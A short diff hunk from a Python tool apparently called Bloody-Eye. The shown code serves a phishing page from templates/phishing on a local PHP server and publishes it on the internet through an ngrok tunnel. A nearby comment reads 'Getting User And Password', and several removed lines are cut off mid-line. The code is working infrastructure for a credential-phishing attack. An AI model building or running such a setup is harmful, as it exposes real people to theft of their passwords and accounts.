@@ -554,11 +554,10 @@ exit();""")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     elif v == "02":
       with open("log","w") as phplog:
-         Popen(("php","-S","localhost:6060","-t","../Bloody-Ey$
+         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing")
       global token
-      a = ngrok.connect(6060,"http",auth_token=token)              
-      print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','')$    
-      print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Li$#
+      a = ngrok.connect(6060,"http",auth_token=token)
+      print(a)      
 # Getting User And Password
     def userin():
         global stat_file
